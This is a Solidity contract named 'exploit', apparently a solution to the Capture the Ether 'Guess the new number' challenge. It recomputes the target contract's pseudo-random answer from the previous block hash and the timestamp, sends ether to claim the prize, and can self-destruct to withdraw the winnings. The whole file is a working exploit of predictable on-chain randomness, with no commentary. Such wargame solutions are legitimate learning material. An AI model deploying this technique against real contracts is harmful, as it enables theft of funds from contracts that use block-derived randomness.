pragma solidity ^0.4.21;

import "./ownership.sol";

contract exploit {
    uint8 guess = 5;
    GuessTheNewNumberChallenge challenge =
        GuessTheNewNumberChallenge(
            address(0x6c77920E6b7d3e408630149B1cc8042Bbd4fA2B6)
        );

    function() external payable {
        // fallback
    }

    function getBalance() public returns (uint256) {
        return address(this).balance;
    }

    function commitSuicide() public {
        selfdestruct(msg.sender);
    }

    function Guess() public payable returns (bool) {
        challenge.guess.value(msg.value)(
            uint8(keccak256(block.blockhash(block.number - 1), now))
        );
    }
}
